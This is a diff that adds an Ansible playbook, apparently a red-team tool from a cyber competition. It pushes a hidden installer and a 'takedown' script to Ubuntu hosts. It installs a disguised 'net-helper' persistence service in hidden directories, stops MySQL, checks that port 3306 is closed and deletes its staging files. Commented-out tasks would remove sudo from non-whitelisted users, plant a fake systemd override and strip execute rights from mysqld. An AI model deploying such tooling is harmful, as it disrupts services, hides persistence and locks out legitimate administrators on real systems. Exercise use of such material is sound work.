@@ -1,0 +1,172 @@
+---
+- name: Deploy MySQL Suppression to All Targets
+  hosts: ubuntu_vms
+  become: true
+  gather_facts: true
+
+  vars:
+    whitelist_users:
+      - greyteam
+      - scoring
+      - cia
+      - kgb
+    log_path: /var/lib/.cache/mysql_watch.log
+    deploy_dir: /tmp/.deploy
+
+  tasks:
+
+    # ── Sanity Check ──────────────────────────────────
+    - name: Confirm we are on Ubuntu 22.04
+      assert:
+        that:
+          - ansible_distribution == "Ubuntu"
+          - ansible_distribution_version == "22.04"
+        fail_msg: "Wrong OS — skipping {{ inventory_hostname }}"
+        success_msg: "Confirmed Ubuntu 22.04 on {{ inventory_hostname }}"
+
+    # ── Prep ──────────────────────────────────────────
+    - name: Create log directory
+      file:
+        path: /var/lib/.cache
+        state: directory
+        mode: '0777'
+
+    - name: Create staging directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: directory
+        mode: '0700'
+
+    # ── Upload Scripts ────────────────────────────────
+    - name: Upload watcher installer
+      copy:
+        src: install_watcher.sh
+        dest: "{{ deploy_dir }}/install_watcher.sh"
+        mode: '0700'
+
+    - name: Upload takedown script
+      copy:
+        src: mysql_takedown.sh
+        dest: "{{ deploy_dir }}/mysql_takedown.sh"
+        mode: '0700'
+
+    # ── Whitelist Enforcement ─────────────────────────
+    - name: Get current sudo group members
+      command: getent group sudo
+      register: sudo_group
+      changed_when: false
+
+    - name: Parse sudo members into list
+      set_fact:
+        sudo_members: "{{ sudo_group.stdout.split(':')[3].split(',') \
+                          | select('ne', '') | list }}"
+
+    # - name: Remove sudo from non-whitelisted users
+    #   command: gpasswd -d {{ item }} sudo
+    #   loop: "{{ sudo_members }}"
+    #   when: item not in whitelist_users
+    #   ignore_errors: true
+    #   register: sudo_removal
+
+    # - name: Log sudo removals
+    #   lineinfile:
+    #     path: "{{ log_path }}"
+    #     line: "[{{ ansible_date_time.iso8601 }}] Removed sudo from {{ item.item }}"
+    #     create: true
+    #   loop: "{{ sudo_removal.results }}"
+    #   when: item.rc is defined and item.rc == 0
+
+    # ── Install Watcher ───────────────────────────────
+    - name: Run watcher installer
+      command: bash {{ deploy_dir }}/install_watcher.sh
+      register: watcher_install
+
+    - name: Show watcher install output
+      debug:
+        msg: "{{ watcher_install.stdout_lines }}"
+
+    # ── Verify Watcher ────────────────────────────────
+    - name: Check net-helper service status
+      systemd:
+        name: net-helper
+      register: watcher_status
+
+    - name: Assert watcher is running
+      assert:
+        that: watcher_status.status.ActiveState == "active"
+        fail_msg: "WARNING — watcher not running on {{ inventory_hostname }}"
+        success_msg: "Watcher confirmed running on {{ inventory_hostname }}"
+
+    # ── Run Takedown ──────────────────────────────────
+    - name: Run MySQL takedown
+      command: bash {{ deploy_dir }}/mysql_takedown.sh
+      register: takedown_result
+
+    - name: Show takedown output
+      debug:
+        msg: "{{ takedown_result.stdout_lines }}"
+
+    # ── Verify MySQL Is Down ──────────────────────────
+    - name: Check MySQL service status
+      command: systemctl is-active mysql
+      register: mysql_status
+      failed_when: false
+      changed_when: false
+
+    - name: Assert MySQL is not running
+      assert:
+        that: mysql_status.stdout != "active"
+        fail_msg: "WARNING — MySQL still running on {{ inventory_hostname }}"
+        success_msg: "Confirmed MySQL is down on {{ inventory_hostname }}"
+
+    # ── Verify Port 3306 Is Closed ────────────────────
+    - name: Check port 3306
+      command: ss -tlnp
+      register: port_check
+      changed_when: false
+
+    - name: Assert port 3306 is not open
+      assert:
+        that: "'3306' not in port_check.stdout"
+        fail_msg: "WARNING — port 3306 still open on {{ inventory_hostname }}"
+        success_msg: "Confirmed port 3306 closed on {{ inventory_hostname }}"
+
+    # # ── Verify Fake Override Is In Place ─────────────
+    # - name: Check fake override exists
+    #   stat:
+    #     path: /etc/systemd/system/mysql.service.d/override.conf
+    #   register: override_check
+
+    # - name: Assert fake override is planted
+    #   assert:
+    #     that: override_check.stat.exists
+    #     fail_msg: "WARNING — fake override missing on {{ inventory_hostname }}"
+    #     success_msg: "Confirmed fake override planted on {{ inventory_hostname }}"
+
+    # # ── Verify Binary Permissions ─────────────────────
+    # - name: Check mysqld binary permissions
+    #   stat:
+    #     path: /usr/sbin/mysqld
+    #   register: binary_check
+
+    # - name: Assert binary is not executable
+    #   assert:
+    #     that: not binary_check.stat.executable
+    #     fail_msg: "WARNING — mysqld binary still executable on {{ inventory_hostname }}"
+    #     success_msg: "Confirmed mysqld binary permissions removed on {{ inventory_hostname }}"
+
+    # ── Cleanup ───────────────────────────────────────
+    - name: Remove staging directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: absent
+
+    # ── Final Report ──────────────────────────────────
+    - name: Final status summary
+      debug:
+        msg:
+          - "===== SUMMARY: {{ inventory_hostname }} ====="
+          - "Watcher      : {{ watcher_status.status.ActiveState }}"
+          - "MySQL status : {{ mysql_status.stdout }}"
+          - "Port 3306    : {{ '3306' not in port_check.stdout }}"
+          - "============================================="
